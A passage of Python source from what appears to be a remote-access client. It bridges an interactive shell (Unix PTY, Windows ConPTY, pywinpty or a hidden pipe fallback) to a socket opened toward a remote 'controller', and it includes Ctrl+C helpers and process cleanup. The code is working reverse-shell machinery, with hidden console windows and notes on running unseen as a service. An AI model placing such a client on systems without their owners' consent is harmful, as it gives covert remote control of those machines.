    channel even when a tunnel makes every connection look like 127.0.0.1.
    """
    deadline = time.time() + SHELL_CONNECT_TIMEOUT
    last_error = None
    while True:
        if SHELL_CANCEL.is_set():
            raise OSError('shell cancelled')
        try:
            sock, _family, _variant = _open_controller_connection(
                host, port, scheme, role='shell', token=token)
        except Exception as e:
            last_error = e
            if SHELL_CANCEL.is_set():
                raise OSError('shell cancelled')
            if time.time() >= deadline:
                raise OSError('could not open the shell channel: {}'.format(last_error))
            time.sleep(0.25)
            continue
        if SHELL_CANCEL.is_set():
            try:
                sock.close()
            except OSError:
                pass
            raise OSError('shell cancelled')
        sock.settimeout(None)
        try:
            _tune_socket(sock)
        except OSError:
            pass
        try:
            sock.set_inheritable(False)     # never leak into the shell child
        except (AttributeError, OSError):
            pass
        return sock


def _pty_write_all(fd, data, timeout=5.0):
    """Write to a non-blocking PTY master, giving up if the shell stops reading.

    A big paste while the foreground job does not read stdin used to block this
    thread (and the whole shell bridge) forever. Dropping the rest after a few
    seconds keeps Ctrl+] and the reconnect path responsive.
    Returns True when every byte was written."""
    view = memoryview(data)
    deadline = time.time() + timeout
    while view:
        try:
            count = os.write(fd, view)
        except BlockingIOError:
            if time.time() >= deadline:
                return False
            select.select([], [fd], [], 0.05)
            continue
        view = view[count:]
    return True


def _signal_pty_group(pid, sig):
    """Signal the shell's whole session (children included) when possible."""
    try:
        os.killpg(pid, sig)             # pty.fork() made pid a session leader
        return True
    except ProcessLookupError:
        return False
    except OSError:
        try:
            os.kill(pid, sig)
            return True
        except OSError:
            return False


def _reap_pty_child(pid, grace=2.0):
    """Stop and reap a PTY shell without ever blocking the client forever.

    The old code did a blocking waitpid(): a shell that ignored SIGTERM (or a
    stopped child) could hang the shell thread, and with it SHELL_BUSY, until
    the whole client was killed. Now: SIGHUP, a bounded WNOHANG wait, then
    SIGKILL, then one more short bounded wait."""
    deadline = time.time() + grace
    for sig in (signal.SIGHUP, signal.SIGKILL):
        _signal_pty_group(pid, sig)
        while time.time() < deadline:
            try:
                done, _ = os.waitpid(pid, os.WNOHANG)
            except ChildProcessError:
                return
            except OSError:
                return
            if done:
                return
            time.sleep(0.05)
        deadline = time.time() + 1.0


def _shell_unix(sock, rows, cols):
    """Bridge a real interactive shell (PTY) to the controller's socket."""
    import fcntl
    import pty
    import signal
    import termios

    pid, master_fd = pty.fork()
    if pid == 0:
        # Child: drop the socket, make the PTY a sane terminal, exec a shell.
        try:
            os.close(sock.fileno())
        except OSError:
            pass
        try:
            attrs = termios.tcgetattr(0)
            attrs[0] |= termios.ICRNL
            attrs[3] |= termios.ICANON | termios.ECHO | termios.ISIG
            termios.tcsetattr(0, termios.TCSANOW, attrs)
        except Exception:
            pass
        # The controller is a plain text bridge, not a real terminal: it does
        # not answer ZLE/readline feature queries (kitty keyboard, OSC 11,
        # XTGETTCAP), so bash/zsh with TERM=xterm-* sat waiting for replies and
        # never processed a single command. A dumb terminal always works; the
        # shell still gets a prompt, echo, backspace and job control.
        os.environ['TERM'] = 'dumb'
        os.environ.pop('COLORTERM', None)
        # Interactive Python helpers (input(), print(prompt, end='')) flush
        # their prompt even when a Windows pipe fallback makes stdout a pipe.
        os.environ['PYTHONUNBUFFERED'] = '1'
        os.environ.setdefault('PYTHONIOENCODING', 'utf-8')
        shell = _shell_executable() or os.environ.get('SHELL') or '/bin/bash'
        if not os.path.exists(shell):
            shell = '/bin/bash' if os.path.exists('/bin/bash') else '/bin/sh'
        try:
            os.execvp(shell, [shell, '-i'])
        except OSError:
            # Last resort, and never return into the client's code from this
            # forked child (that would duplicate the whole process).
            try:
                os.execvp('/bin/sh', ['/bin/sh', '-i'])
            except OSError:
                pass
        os._exit(1)

    if rows > 0 and cols > 0:
        try:
            fcntl.ioctl(master_fd, termios.TIOCSWINSZ,
                        struct.pack('HHHH', rows, cols, 0, 0))
        except OSError:
            pass
    try:
        os.set_blocking(master_fd, False)
    except (AttributeError, OSError):
        try:
            flags = fcntl.fcntl(master_fd, fcntl.F_GETFL)
            fcntl.fcntl(master_fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
        except OSError:
            pass

    try:
        shell_gone = False
        shell_gone_at = 0.0
        while True:
            # A background job (`sleep 30 &`) keeps the PTY slave open after
            # the shell itself exits, so read() never reaches EIO and the
            # controller's shell looked hung until that job finished. Reap the
            # shell separately, then drain the last output and stop promptly.
            if not shell_gone:
                try:
                    shell_done, _ = os.waitpid(pid, os.WNOHANG)
                except ChildProcessError:
                    shell_done = pid
                except OSError:
                    shell_done = 0
                if shell_done:
                    shell_gone = True
                    shell_gone_at = time.time()
            # Never wait forever here: when a disowned/background child keeps
            # the PTY slave open, the shell can exit without producing any
            # further output, so select() would never wake and waitpid() would
            # never see the zombie. A short poll notices the exit promptly.
            readable, _, _ = select.select([sock, master_fd], [], [],
                                           0.05 if shell_gone else 0.2)
            if shell_gone and (not readable
                               or time.time() - shell_gone_at > 0.25):
                break
            if sock in readable and not shell_gone:
                data = sock.recv(65536)
                if not data:
                    break
                try:
                    if not _pty_write_all(master_fd, data):
                        if not _send_shell_output(
                                sock, b'\r\n[client] shell input dropped: '
                                      b'the shell is not reading\r\n'):
                            break
                except OSError:
                    break               # shell exited, PTY master closed
            if master_fd in readable:
                try:
                    data = os.read(master_fd, 65536)
                except BlockingIOError:
                    continue
                except OSError as e:
                    if e.errno == errno.EIO:
                        break           # Linux: EIO == EOF when the slave closes
                    raise
                if not data:
                    break
                if not _send_shell_output(sock, data):
                    break
    finally:
        try:
            os.close(master_fd)         # closing first makes the shell see EOF/HUP
        except OSError:
            pass
        _reap_pty_child(pid)            # bounded: never blocks forever on a stuck shell


def _shell_child_env():
    """Environment for the target shell and interactive programs."""
    env = dict(os.environ)
    env['PYTHONUNBUFFERED'] = '1'
    env.setdefault('PYTHONIOENCODING', 'utf-8')
    return env


def _shell_notice(sock, text):
    """Show a diagnostic line on the controller side of the shell channel.

    A Windows client is often started hidden (pythonw / a service).  Printing
    a fallback warning only to the client's own console made every Windows
    shell problem invisible.  The shell channel is raw terminal data, so a
    short CRLF-terminated notice is safe and appears above the shell prompt.
    """
    _send_shell_output(
        sock, ('\r\n[client] {}\r\n'.format(text)).encode('utf-8', 'replace'))


# A tiny, persistent helper that lives in the *pseudoconsole's* console and
# turns a request into a real CTRL_C_EVENT.  0x03 written to ConPTY only does
# that while the hosted program keeps ENABLE_PROCESSED_INPUT on; some
# long-running programs turn it off.  GenerateConsoleCtrlEvent always delivers
# the event, exactly like pressing Ctrl+C on a physical keyboard.  The helper
# ignores Ctrl+C for itself, so repeated presses cannot kill it.
_WINDOWS_CTRLC_HELPER = r'''
import ctypes
import sys
import time

k32 = ctypes.WinDLL('kernel32', use_last_error=True)
k32.AttachConsole.argtypes = [ctypes.c_uint32]
k32.AttachConsole.restype = ctypes.c_int
k32.FreeConsole.argtypes = []
k32.FreeConsole.restype = ctypes.c_int
k32.GenerateConsoleCtrlEvent.argtypes = [ctypes.c_uint32, ctypes.c_uint32]
k32.GenerateConsoleCtrlEvent.restype = ctypes.c_int
k32.SetConsoleCtrlHandler.argtypes = [ctypes.c_void_p, ctypes.c_int]
k32.SetConsoleCtrlHandler.restype = ctypes.c_int

pid = int(sys.argv[1])
k32.FreeConsole()
attached = False
for _ in range(100):
    if k32.AttachConsole(pid):
        attached = True
        break
    time.sleep(0.05)
if not attached:
    sys.exit(2)
k32.SetConsoleCtrlHandler(None, 1)
out = sys.stdout.buffer
out.write(b'R\n')
out.flush()
while True:
    line = sys.stdin.buffer.readline()
    if not line:
        break
    if line.strip() == b'C':
        # D = the console event was delivered, E = it was refused (the
        # caller then falls back to writing 0x03 itself).  Stay alive after
        # a failure so a later Ctrl+C can still be attempted.
        if k32.GenerateConsoleCtrlEvent(0, 0):
            out.write(b'D\n')
        else:
            out.write(b'E\n')
        out.flush()
sys.exit(0)
'''


class _WindowsCtrlCHelper(object):
    """A helper process attached to the shell's console (see above)."""

    def __init__(self, pid):
        self.proc = None
        self.ready = threading.Event()
        self.dead = threading.Event()
        self.lock = threading.Lock()
        self._cond = threading.Condition()
        self._response = None
        try:
            # Do NOT pass CREATE_NO_WINDOW here.  A process with a console of
            # its own cannot AttachConsole() to the shell; the helper frees its
            # console first, but avoiding a fresh console is more reliable and
            # lets it attach to both a ConPTY and the hidden pipe-fallback
            # console.  Its stdio is redirected, so it never flashes a window.
            self.proc = subprocess.Popen(
                [sys.executable, '-c', _WINDOWS_CTRLC_HELPER, str(pid)],
                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                stderr=subprocess.DEVNULL, bufsize=0, close_fds=True)
        except (OSError, ValueError):
            self.dead.set()
            self.ready.set()
            return
        threading.Thread(target=self._reader, name='windows-ctrlc-helper',
                         daemon=True).start()

    def _reader(self):
        """First line R = attached; later D/E = event delivered/refused."""
        first = True
        try:
            while True:
                line = self.proc.stdout.readline()
                if not line:
                    break
                tag = line.strip()
                if first:
                    first = False
                    if tag == b'R':
                        self.ready.set()
                        continue
                    break
                if tag in (b'D', b'E'):
                    with self._cond:
                        self._response = tag
                        self._cond.notify_all()
        except (OSError, ValueError):
            pass
        finally:
            with self._cond:
                self.dead.set()
                self.ready.set()
                self._cond.notify_all()

    def send(self):
        """Press Ctrl+C and wait for the helper's confirmation.

        False means the event was not delivered (helper missing, attach
        refused, GenerateConsoleCtrlEvent failed), so the caller writes 0x03
        as a fallback instead of assuming success."""
        if self.dead.is_set() or not self.ready.is_set() or self.proc is None:
            return False
        with self._cond:
            self._response = None
        with self.lock:
            try:
                self.proc.stdin.write(b'C\n')
                self.proc.stdin.flush()
            except (OSError, ValueError):
                self.dead.set()
                return False
        deadline = time.time() + 1.0
        with self._cond:
            while self._response is None and not self.dead.is_set():
                remaining = deadline - time.time()
                if remaining <= 0:
                    break
                self._cond.wait(remaining)
            return self._response == b'D'

    def close(self):
        self.dead.set()
        with self._cond:
            self._cond.notify_all()
        if self.proc is None:
            return
        try:
            self.proc.stdin.close()
        except (OSError, ValueError):
            pass
        try:
            self.proc.terminate()
        except OSError:
            pass
        try:
            self.proc.wait(timeout=0.5)
        except Exception:
            try:
                self.proc.kill()
            except OSError:
                pass


class _WindowsInputWriter(object):
    """Bounded, priority-aware writer for a Windows console input stream.

    WriteFile to a ConPTY input pipe is synchronous.  A program that stops
    reading (or a huge paste that fills the console input buffer) could park
    the old socket-reader thread forever, which also stopped Ctrl+C from being
    seen.  All input now goes through this daemon thread.  Ctrl+C jumps ahead
    of queued paste, and CancelSynchronousIo frees a blocked WriteFile so the
    interrupt is delivered immediately instead of after the paste drains.
    """

    def __init__(self, write_chunk, ctrl_c, max_pending=4 * 1024 * 1024):
        self._write_chunk = write_chunk
        self._ctrl_c = ctrl_c
        self._max_pending = max_pending
        self._cond = threading.Condition()
        self._data = bytearray()
        self._ctrl = 0
        self._stop = False
        self.dropped = 0
        self.failed = threading.Event()
        self.thread = threading.Thread(target=self._run,
                                       name='windows-shell-input', daemon=True)
        self.thread.start()

    def send(self, data):
        if not data or self.failed.is_set():
            return
        pieces = data.split(b'\x03')
        with self._cond:
            for index, piece in enumerate(pieces):
                if piece:
                    room = max(0, self._max_pending - len(self._data))
                    take = min(len(piece), room)
                    if take:
                        self._data += piece[:take]
                    if take < len(piece):
                        # Only the bytes that did not fit were dropped; the
                        # old arithmetic also counted bytes that were queued.
                        self.dropped += len(piece) - take
                if index != len(pieces) - 1:
                    self._ctrl = min(self._ctrl + 1, 64)
            has_ctrl = self._ctrl > 0
            self._cond.notify()
        # Free a WriteFile parked in a full console buffer even when the
        # Ctrl+C is the only pending byte (a paste that filled the buffer and
        # then pressed Ctrl+C).  Otherwise the interrupt waits for the write.
        if has_ctrl:
            self._cancel_blocked_write()

    def _cancel_blocked_write(self):
        """Best effort: stop a WriteFile stuck in a full console buffer."""
        try:
            import ctypes
            import ctypes.wintypes as wt
            tid = getattr(self.thread, 'native_id', None)
            if not tid:
                return
            k32 = ctypes.WinDLL('kernel32', use_last_error=True)
            k32.OpenThread.argtypes = [wt.DWORD, wt.BOOL, wt.DWORD]
            k32.OpenThread.restype = wt.HANDLE
            k32.CancelSynchronousIo.argtypes = [wt.HANDLE]
            k32.CancelSynchronousIo.restype = wt.BOOL
            k32.CloseHandle.argtypes = [wt.HANDLE]
            handle = k32.OpenThread(0x0001, False, tid)   # THREAD_TERMINATE
            if handle:
                try:
                    k32.CancelSynchronousIo(handle)
                finally:
                    k32.CloseHandle(handle)
        except Exception:
            pass

    def _run(self):
        while True:
            with self._cond:
                while not self._stop and not self._ctrl and not self._data:
                    self._cond.wait(0.2)
                if self._stop and not self._ctrl:
                    return
                if self._ctrl:
                    self._ctrl -= 1
                    chunk = None
                else:
                    chunk = bytes(self._data[:65536])
                    del self._data[:65536]
            try:
                if chunk is None:
                    ok = self._ctrl_c()
                else:
                    # None = the write was cancelled to deliver Ctrl+C;
                    # that is not a failure, so just let the event go next.
                    ok = self._write_chunk(chunk) is not False
            except Exception:
                ok = False
            if not ok:
                self.failed.set()
                return

    def close(self, wait=0.5):
        with self._cond:
            self._stop = True
            self._cond.notify()
        try:
            self.thread.join(wait)
        except Exception:
            pass


def _shell_windows_conpty(sock, rows, cols):
    """Run PowerShell/cmd in a real Windows pseudo-console (ConPTY).

    This is the Windows equivalent of a Unix PTY.  Unlike the pipe fallback,
    the console host echoes typed characters, streams output as it is
    produced, and turns Ctrl+C into a real console event.  The pseudo-console
    input/output channels are synchronous, so reading always happens on its
    own thread and writing goes through _WindowsInputWriter.

    Raises RuntimeError with the failing API stage instead of returning False
    silently: a hidden Windows client made every setup error invisible, which
    is why a broken ConPTY quietly degraded to the non-echoing pipe fallback.
    """
    import ctypes
    import ctypes.wintypes as wt

    k32 = ctypes.WinDLL('kernel32', use_last_error=True)
    if not (hasattr(k32, 'CreatePseudoConsole')
            and hasattr(k32, 'ClosePseudoConsole')
            and hasattr(k32, 'ResizePseudoConsole')):
        raise RuntimeError('ConPTY needs Windows 10 1809 or newer')

    HANDLE = wt.HANDLE
    DWORD = wt.DWORD
    BOOL = wt.BOOL
    LPVOID = ctypes.c_void_p
    SIZE_T = ctypes.c_size_t
    HRESULT = ctypes.c_long
    COORD = type('COORD', (ctypes.Structure,), {
        '_fields_': [('X', ctypes.c_short), ('Y', ctypes.c_short)]})
    STARTUPINFO = type('STARTUPINFO', (ctypes.Structure,), {
        '_fields_': [
            ('cb', DWORD), ('lpReserved', wt.LPWSTR), ('lpDesktop', wt.LPWSTR),
            ('lpTitle', wt.LPWSTR), ('dwX', DWORD), ('dwY', DWORD),
            ('dwXSize', DWORD), ('dwYSize', DWORD),
            ('dwXCountChars', DWORD), ('dwYCountChars', DWORD),
            ('dwFillAttribute', DWORD), ('dwFlags', DWORD),
            ('wShowWindow', wt.WORD), ('cbReserved2', wt.WORD),
            ('lpReserved2', ctypes.POINTER(ctypes.c_byte)),
            ('hStdInput', HANDLE), ('hStdOutput', HANDLE),
            ('hStdError', HANDLE)]})
    STARTUPINFOEX = type('STARTUPINFOEX', (ctypes.Structure,), {
        '_fields_': [('StartupInfo', STARTUPINFO),
                     ('lpAttributeList', LPVOID)]})
    PROCESS_INFORMATION = type('PROCESS_INFORMATION', (ctypes.Structure,), {
        '_fields_': [('hProcess', HANDLE), ('hThread', HANDLE),
                     ('dwProcessId', DWORD), ('dwThreadId', DWORD)]})

    k32.CreatePipe.argtypes = [ctypes.POINTER(HANDLE), ctypes.POINTER(HANDLE),
                               LPVOID, DWORD]
    k32.CreatePipe.restype = BOOL
    k32.CreatePseudoConsole.argtypes = [COORD, HANDLE, HANDLE, DWORD,
                                        ctypes.POINTER(HANDLE)]
    k32.CreatePseudoConsole.restype = HRESULT
    k32.ResizePseudoConsole.argtypes = [HANDLE, COORD]
    k32.ResizePseudoConsole.restype = HRESULT
    k32.ClosePseudoConsole.argtypes = [HANDLE]
    k32.ClosePseudoConsole.restype = None
    k32.InitializeProcThreadAttributeList.argtypes = [
        LPVOID, DWORD, DWORD, ctypes.POINTER(SIZE_T)]
    k32.InitializeProcThreadAttributeList.restype = BOOL
    k32.UpdateProcThreadAttribute.argtypes = [
        LPVOID, DWORD, ctypes.c_size_t, LPVOID, SIZE_T, LPVOID, LPVOID]
    k32.UpdateProcThreadAttribute.restype = BOOL
    k32.DeleteProcThreadAttributeList.argtypes = [LPVOID]
    k32.DeleteProcThreadAttributeList.restype = None
    k32.CreateProcessW.argtypes = [
        wt.LPCWSTR, wt.LPWSTR, LPVOID, LPVOID, BOOL, DWORD, LPVOID,
        wt.LPCWSTR, ctypes.POINTER(STARTUPINFO),
        ctypes.POINTER(PROCESS_INFORMATION)]
    k32.CreateProcessW.restype = BOOL
    k32.ReadFile.argtypes = [HANDLE, LPVOID, DWORD,
                             ctypes.POINTER(DWORD), LPVOID]
    k32.ReadFile.restype = BOOL
    k32.WriteFile.argtypes = [HANDLE, LPVOID, DWORD,
                              ctypes.POINTER(DWORD), LPVOID]
    k32.WriteFile.restype = BOOL
    k32.TerminateProcess.argtypes = [HANDLE, ctypes.c_uint]
    k32.TerminateProcess.restype = BOOL
    k32.WaitForSingleObject.argtypes = [HANDLE, DWORD]
    k32.WaitForSingleObject.restype = DWORD
    k32.CloseHandle.argtypes = [HANDLE]
    k32.CloseHandle.restype = BOOL

    PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE = 0x00020016
    EXTENDED_STARTUPINFO_PRESENT = 0x00080000
    CREATE_UNICODE_ENVIRONMENT = 0x00000400
    ERROR_OPERATION_ABORTED = 995
    ERROR_INSUFFICIENT_BUFFER = 122

    def close(handle):
        if handle:
            try:
                k32.CloseHandle(handle)
            except Exception:
                pass

    in_read = in_write = out_read = out_write = None
    hpc = None
    attr_buf = None
    si = STARTUPINFOEX()
    pi = PROCESS_INFORMATION()
    stage = 'starting'
    try:
        stage = 'CreatePipe(input)'
        in_read, in_write = HANDLE(), HANDLE()
        out_read, out_write = HANDLE(), HANDLE()
        if not k32.CreatePipe(ctypes.byref(in_read), ctypes.byref(in_write),
                              None, 0):
            raise OSError(ctypes.get_last_error(), 'CreatePipe(input)')
        stage = 'CreatePipe(output)'
        if not k32.CreatePipe(ctypes.byref(out_read), ctypes.byref(out_write),
                              None, 0):
            raise OSError(ctypes.get_last_error(), 'CreatePipe(output)')
        stage = 'CreatePseudoConsole'
        hpc = HANDLE()
        hr = k32.CreatePseudoConsole(
            COORD(max(1, int(cols)), max(1, int(rows))),
            in_read, out_write, 0, ctypes.byref(hpc))
        if hr != 0:
            raise OSError(hr, 'CreatePseudoConsole')

        stage = 'InitializeProcThreadAttributeList'
        # The attribute list is allocated separately because ctypes cannot
        # pass a pointer-to-pointer the way InitializeProcThreadAttributeList
        # wants.  The first call reports the required size in ERROR_INSUFFICIENT_
        # BUFFER; that is expected, not a failure.
        need = SIZE_T()
        k32.InitializeProcThreadAttributeList(
            None, 1, 0, ctypes.byref(need))
        if need.value <= 0:
            raise OSError(ctypes.get_last_error(),
                          'InitializeProcThreadAttributeList(size)')
        attr_buf = ctypes.create_string_buffer(max(1, need.value))
        if not k32.InitializeProcThreadAttributeList(
                ctypes.cast(attr_buf, LPVOID), 1, 0, ctypes.byref(need)):
            raise OSError(ctypes.get_last_error(),
                          'InitializeProcThreadAttributeList')
        stage = 'UpdateProcThreadAttribute'
        if not k32.UpdateProcThreadAttribute(
                ctypes.cast(attr_buf, LPVOID), 0,
                PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
                ctypes.cast(hpc, LPVOID), ctypes.sizeof(HANDLE),
                None, None):
            raise OSError(ctypes.get_last_error(),
                          'UpdateProcThreadAttribute')

        si.StartupInfo.cb = ctypes.sizeof(STARTUPINFOEX)
        si.lpAttributeList = ctypes.cast(attr_buf, LPVOID)

        shell = 'powershell.exe' if shutil.which('powershell.exe') else 'cmd.exe'
        app = shutil.which(shell) or shell
        # -NoLogo starts printing the prompt immediately.  Profiles are left
        # enabled so aliases/functions the user relies on still exist.
        args = ' -NoLogo' if shell.lower() == 'powershell.exe' else ''
        cmdline = ctypes.create_unicode_buffer('"{}"{}'.format(app, args))
        # Sorted environment: some Windows components expect that layout, and
        # Python children still inherit PYTHONUNBUFFERED=1 / UTF-8.
        env = _shell_child_env()
        items = sorted(((k, v) for k, v in env.items()
                        if k and '=' not in k), key=lambda item: item[0].upper())
        env_block = ctypes.create_unicode_buffer(
            '\0'.join('{}={}'.format(k, v) for k, v in items) + '\0\0')
        stage = 'CreateProcessW'
        if not k32.CreateProcessW(
                app, cmdline, None, None, False,
                EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT,
                ctypes.cast(env_block, LPVOID), None,
                ctypes.byref(si.StartupInfo), ctypes.byref(pi)):
            raise OSError(ctypes.get_last_error(), 'CreateProcessW')
        # The pseudo-console owns the child ends after process creation; only
        # the parent ends may stay open (closing them is required to see EOF).
        close(in_read)
        close(out_write)
        in_read = out_write = None
    except Exception as exc:
        close(in_write)
        close(out_read)
        close(in_read)
        close(out_write)
        if hpc:
            try:
                k32.ClosePseudoConsole(hpc)
            except Exception:
                pass
        close(pi.hThread)
        close(pi.hProcess)
        if attr_buf is not None:
            try:
                k32.DeleteProcThreadAttributeList(
                    ctypes.cast(attr_buf, LPVOID))
            except Exception:
                pass
        raise RuntimeError('{}: {}'.format(stage, exc))

    # The console is live.  Keep output draining on its own thread: ConPTY is
    # a synchronous pipe, and a full output buffer while we wait for input
    # would deadlock both the shell and this client.
    stop = threading.Event()

    def reader():
        # Keep draining even after the session is being torn down:
        # ClosePseudoConsole can block while output is still buffered in the
        # pipe, so stopping this thread first would deadlock the shutdown.
        buf = ctypes.create_string_buffer(65536)
        try:
            while True:
                n = DWORD()
                if not k32.ReadFile(out_read, buf, len(buf),
                                    ctypes.byref(n), None):
                    break
                if not n.value:
                    break
                if not _send_shell_output(sock, buf.raw[:n.value]):
                    break
        finally:
            stop.set()

    def write_chunk(data):
        view = memoryview(data)
        while view:
            written = DWORD()
            if not k32.WriteFile(in_write, bytes(view), len(view),
                                 ctypes.byref(written), None):
                if ctypes.get_last_error() == ERROR_OPERATION_ABORTED:
                    return None       # freed for a priority Ctrl+C
                return False
            if written.value <= 0:
                return False
            view = view[written.value:]
        return True

    helper = None
    writer = None
    reader_thread = threading.Thread(target=reader, name='conpty-reader',
                                     daemon=True)
    reader_thread.start()
    try:
        helper = _WindowsCtrlCHelper(pi.dwProcessId)

        def ctrl_c():
            # Prefer the real console event.  If the helper could not attach
            # (policy/VirtualDesktop restrictions), 0x03 still works whenever
            # the hosted program left ENABLE_PROCESSED_INPUT enabled.
            if helper is not None and helper.send():
                return True
            return write_chunk(b'\x03') is not False

        writer = _WindowsInputWriter(write_chunk, ctrl_c)
        while not stop.is_set() and not writer.failed.is_set():
            # ConPTY keeps the output pipe open after the shell exits until
            # ClosePseudoConsole is called, so the process handle is the
            # reliable 'exit' signal; give the reader a moment to drain the
            # final prompt before tearing the session down.
            try:
                if k32.WaitForSingleObject(pi.hProcess, 0) == 0:
                    time.sleep(0.08)
                    stop.set()
                    break
            except Exception:
                pass
            try:
                readable, _, _ = select.select([sock], [], [], 0.2)
            except (OSError, ValueError):
                break
            if not readable:
                continue
            try:
                data = sock.recv(65536)
            except (OSError, ConnectionError, EOFError):
                break
            if not data:
                break
            writer.send(data)
    except Exception:
        pass
    finally:
        stop.set()
        try:
            if writer is not None:
                writer.close()
        except Exception:
            pass
        try:
            if helper is not None:
                helper.close()
        except Exception:
            pass
        try:
            k32.TerminateProcess(pi.hProcess, 1)
        except Exception:
            pass
        try:
            k32.WaitForSingleObject(pi.hProcess, 1000)
        except Exception:
            pass
        # Close the console before the pipe handles so ConPTY can flush its
        # final frame without blocking on a full output buffer.
        try:
            k32.ClosePseudoConsole(hpc)
        except Exception:
            pass
        try:
            reader_thread.join(1.0)
        except Exception:
            pass
        for handle in (in_write, out_read, pi.hThread, pi.hProcess):
            close(handle)
        try:
            k32.DeleteProcThreadAttributeList(ctypes.cast(attr_buf, LPVOID))
        except Exception:
            pass
    return True


def _shell_windows(sock, rows, cols):
    """Bridge a PowerShell/cmd console to the controller's socket."""
    # Prefer the built-in ConPTY bridge: it is a real terminal, so cmd.exe
    # echoes typed characters and live output is not hidden in a pipe buffer.
    if os.name == 'nt':
        try:
            _shell_windows_conpty(sock, rows, cols)
            return
        except Exception as exc:
            reason = str(exc) or exc.__class__.__name__
            print('[!] ConPTY shell failed ({}); trying pywinpty.'.format(reason))
            _shell_notice(sock, 'ConPTY unavailable: {}'.format(reason))
    try:
        import winpty                   # pywinpty >= 3.0.5: pip install pywinpty
    except Exception as exc:            # ImportError, or a missing DLL/OSError
        reason = str(exc) or exc.__class__.__name__
        print('[!] pywinpty is unavailable ({}); using the pipe fallback.'
              .format(reason))
        _shell_notice(sock, 'No ConPTY/pywinpty ({}); using the limited pipe '
                            'fallback (line input, local echo).'.format(reason))
        _shell_windows_pipes(sock)
        return

    shell = 'powershell.exe' if shutil.which('powershell.exe') else 'cmd.exe'
    try:
        try:
            pty = winpty.PtyProcess.spawn(shell, dimensions=(rows, cols),
                                          env=_shell_child_env())
        except TypeError:
            # Older pywinpty releases do not accept env=; the caller's
            # environment is inherited in that case.
            pty = winpty.PtyProcess.spawn(shell, dimensions=(rows, cols))
    except Exception as exc:
        reason = str(exc) or exc.__class__.__name__
        print('[!] pywinpty could not start the shell ({}); using the pipe '
              'fallback.'.format(reason))
        _shell_notice(sock, 'pywinpty failed ({}); using the limited pipe '
                            'fallback (line input, local echo).'.format(reason))
        _shell_windows_pipes(sock)
        return

    stop = threading.Event()

    def reader():
        try:
            while not stop.is_set():
                try:
                    data = pty.read()       # str (Unicode) in pywinpty v3+
                except EOFError:
                    break
                if not data:
                    # A transient empty read must not kill output forever;
                    # only stop when the console process itself is gone.
                    alive = getattr(pty, 'isalive', None)
                    try:
                        if alive is not None and not alive():
                            break
                    except Exception:
                        break
                    time.sleep(0.01)
                    continue
                if isinstance(data, str):
                    data = data.encode('utf-8', 'replace')
                if not _send_shell_output(sock, data):
                    break
        except Exception:
            pass
        finally:
            stop.set()

    threading.Thread(target=reader, daemon=True).start()

    def write_chunk(data):
        try:
            pty.write(data.decode('utf-8', 'replace'))
            return True
        except (OSError, ValueError, EOFError):
            return False

    def ctrl_c():
        # pywinpty owns a real hidden console, and 0x03 reaches it as a key.
        return write_chunk(b'\x03')

    writer = _WindowsInputWriter(write_chunk, ctrl_c)
    try:
        while not stop.is_set() and not writer.failed.is_set():
            try:
                readable, _, _ = select.select([sock], [], [], 0.2)
            except (OSError, ValueError):
                break
            if not readable:
                # Do not wait for output to notice the console exited.
                alive = getattr(pty, 'isalive', None)
                try:
                    if alive is not None and not alive():
                        break
                except Exception:
                    pass
                continue
            try:
                data = sock.recv(65536)
            except (OSError, ConnectionError, EOFError):
                break
            if not data:
                break
            # Do not rewrite CR to CRLF here: the controller already sends a
            # lone CR for Enter, and pywinpty turns that into the Enter key.
            writer.send(data)
    except (OSError, ConnectionError, EOFError):
        pass
    finally:
        stop.set()
        writer.close()
        try:
            pty.terminate()
        except Exception:
            pass


def _filter_shell_keys(text):
    """Remove terminal escape sequences from pasted/typed pipe-fallback input.

    Returns (printable_text, unfinished_escape).  Arrow keys and function
    keys cannot be represented in a plain pipe; forwarding their raw bytes
    to PowerShell/cmd only inserts garbage into the command line.
    """
    out = []
    index = 0
    length = len(text)
    while index < length:
        char = text[index]
        if char != '\x1b':
            out.append(char)
            index += 1
            continue
        next_index = index + 1
        if next_index >= length:
            return ''.join(out), text[index:]
        if text[next_index] in ('[', 'O'):
            next_index += 1
            while next_index < length and not ('@' <= text[next_index] <= '~'):
                next_index += 1
            if next_index >= length:
                return ''.join(out), text[index:]
            index = next_index + 1
            continue
        index += 2
    return ''.join(out), ''


def _shell_windows_pipes(sock):
    """Line-oriented last-resort fallback when no Windows PTY exists.

    A redirected cmd/PowerShell does not echo typed characters, and programs
    that insist on a console may buffer or refuse interactive input.  This
    mode therefore renders the typed line locally, submits complete lines on
    Enter, streams child output immediately, and uses the console-events
    helper for Ctrl+C (0x03 written to a pipe is not an interrupt).  ConPTY
    and pywinpty remain the real shell implementations; this keeps the
    session usable on locked-down systems where both are unavailable.
    """
    shell = 'powershell.exe' if shutil.which('powershell.exe') else 'cmd.exe'
    # A real hidden console is required for Ctrl+C: 0x03 written to a pipe is
    # just a byte.  CREATE_NEW_CONSOLE gives the helper a console to attach to
    # for GenerateConsoleCtrlEvent, while STARTF_USESHOWWINDOW/SW_HIDE keeps
    # the window invisible on normal desktops and servers.
    startupinfo = None
    creationflags = CREATE_NO_WINDOW
    if os.name == 'nt':
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= getattr(subprocess, 'STARTF_USESHOWWINDOW', 1)
        startupinfo.wShowWindow = getattr(subprocess, 'SW_HIDE', 0)
        creationflags = 0x00000010          # CREATE_NEW_CONSOLE
    proc = subprocess.Popen([shell], stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.STDOUT, bufsize=0,
                            close_fds=True,          # never inherit socket handles
                            startupinfo=startupinfo,
                            creationflags=creationflags,
                            env=_shell_child_env())

    send_lock = threading.Lock()

    def send_raw(data):
        # Pipe-fallback output can also burst (dir /s, a long build log).
        # Never let one temporary SO_SNDTIMEO tear the shell down.
        with send_lock:
            return _send_shell_output(sock, data)

    stop = threading.Event()

    def pump():
        try:
            while not stop.is_set():
                chunk = os.read(proc.stdout.fileno(), 65536)
                if not chunk:
                    break
                send_raw(chunk)
        except OSError:
            pass
        finally:
            stop.set()
            try:
                sock.shutdown(socket.SHUT_WR)
            except OSError:
                pass

    threading.Thread(target=pump, name='pipe-shell-output', daemon=True).start()

